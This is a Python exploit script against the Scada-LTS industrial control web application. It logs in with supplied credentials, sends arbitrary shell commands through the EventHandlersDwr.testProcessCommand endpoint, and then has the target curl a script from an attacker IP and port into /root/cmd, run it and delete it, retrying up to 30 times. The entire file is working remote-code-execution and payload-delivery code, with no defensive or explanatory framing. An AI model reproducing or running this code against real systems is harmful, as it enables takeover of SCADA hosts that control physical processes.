import time
import requests
import urllib.parse

class RCE(object):

    def __init__(self, scada_url, username_scada, password_scada, attacker_ip, attacker_port):
        self.scada_url = scada_url
        self.username_scada = username_scada
        self.password_scada = password_scada
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port

    def execute_cmd(self, cmd):
        res = requests.get(self.scada_url+f'/ScadaLTS/api/auth/{self.username_scada}/{self.password_scada}')
        jsession_cookie=res.headers['Set-Cookie']

        headers = {'Cookie': jsession_cookie,
        'Content-Type': 'text/plain'}

        cmd = urllib.parse.quote_plus('command:'+cmd)
        
        res = requests.post(self.scada_url+'/ScadaLTS/dwr/call/plaincall/EventHandlersDwr.testProcessCommand.dwr', 
        headers=headers,
        data=f"callCount=1&scriptSessionId=&c0-scriptName=EventHandlersDwr&c0-methodName=testProcessCommand&c0-param0={cmd}")

    def execute_script(self, scriptname):
        for i in range(30):
            print(f"Tentativo {i}", flush=True)
            try:
                self.execute_cmd(f"curl {self.attacker_ip}:{self.attacker_port}/get_script/{scriptname} -o /root/cmd")
                self.execute_cmd("chmod 777 /root/cmd")
                self.execute_cmd("/root/cmd")
                time.sleep(5)
                self.execute_cmd("rm -f /root/cmd")
                print("Script executed", flush=True)
                break
            except Exception as e:
                print("ERROR! Retrying in 15s", flush=True)
                time.sleep(15)
                print(e, flush=True)